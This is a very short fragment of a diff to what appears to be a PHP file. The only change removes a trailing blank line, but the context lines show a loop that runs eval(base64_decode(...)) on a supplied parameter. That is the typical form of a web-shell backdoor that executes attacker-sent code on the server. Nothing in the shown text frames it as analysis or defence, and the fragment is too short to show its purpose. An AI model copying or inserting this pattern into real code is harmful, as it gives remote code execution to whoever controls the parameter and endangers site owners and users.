@@ -14,4 +14,3 @@ foreach ($arr as $i) {
 		eval(base64_decode($i[PARAM]));
 	}
 }
-
